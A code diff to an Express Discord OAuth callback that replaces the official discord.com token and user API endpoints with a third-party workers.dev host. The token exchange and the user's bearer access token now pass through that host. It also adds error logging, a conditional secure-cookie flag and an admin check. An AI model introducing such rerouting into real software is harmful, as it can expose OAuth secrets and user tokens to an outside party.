@@ -22,7 +22,7 @@ exports.callback = async (req, res) => {
     if (error) return res.redirect(FRONTEND_URL + '?discord=denied');
     if (!code) return res.redirect(FRONTEND_URL + '?discord=denied');
 
-    const tokenResp = await fetch('https://discord.com/api/oauth2/token', {
+    const tokenResp = await fetch('https://young-silence-7da5.vandzvl09.workers.dev/api/oauth2/token', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: new URLSearchParams({
@@ -33,13 +33,31 @@ exports.callback = async (req, res) => {
         redirect_uri: REDIRECT_URI,
       }),
     });
-    const tokenData = await tokenResp.json();
+    
+      let tokenData;
+      const tokenText = await tokenResp.text();
+      try {
+          tokenData = JSON.parse(tokenText);
+      } catch (e) {
+          console.error('Discord Token Error Response:', tokenText);
+          return res.redirect(FRONTEND_URL + '?discord=denied');
+      }
+
     if (!tokenData.access_token) return res.status(400).json({ error: 'Failed to get token' });
 
-    const userResp = await fetch('https://discord.com/api/users/@me', {
+    const userResp = await fetch('https://young-silence-7da5.vandzvl09.workers.dev/api/users/@me', {
       headers: { Authorization: 'Bearer ' + tokenData.access_token },
     });
-    const discordUser = await userResp.json();
+    
+      let discordUser;
+      const userText = await userResp.text();
+      try {
+          discordUser = JSON.parse(userText);
+      } catch (e) {
+          console.error('Discord User Error Response:', userText);
+          return res.redirect(FRONTEND_URL + '?discord=denied');
+      }
+
     if (!discordUser.id) return res.status(400).json({ error: 'Failed to get user' });
 
     const player = await prisma.player.findFirst({ where: { discordId: discordUser.id } });
@@ -56,7 +74,7 @@ exports.callback = async (req, res) => {
 
     res.cookie('discord_token', token, {
       httpOnly: true,
-      secure: false,
+      secure: process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] === 'https',
       sameSite: 'lax',
       maxAge: 7 * 24 * 60 * 60 * 1000,
     });
@@ -68,7 +86,9 @@ exports.callback = async (req, res) => {
 };
 
 exports.me = (req, res) => {
-  res.json({ user: req.discordUser });
+  const adminIds = (process.env.ADMIN_DISCORD_IDS || '').split(',').map(id => id.trim());
+  const isAdmin = adminIds.includes(req.discordUser.discordId);
+  res.json({ user: { ...req.discordUser, isAdmin } });
 };
 
 // Re-issue JWT to extend session (7 more days)
@@ -86,7 +106,7 @@ exports.refresh = async (req, res) => {
     const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' });
     res.cookie('discord_token', token, {
       httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
+      secure: process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] === 'https',
       sameSite: 'lax',
       maxAge: 7 * 24 * 60 * 60 * 1000,
     });
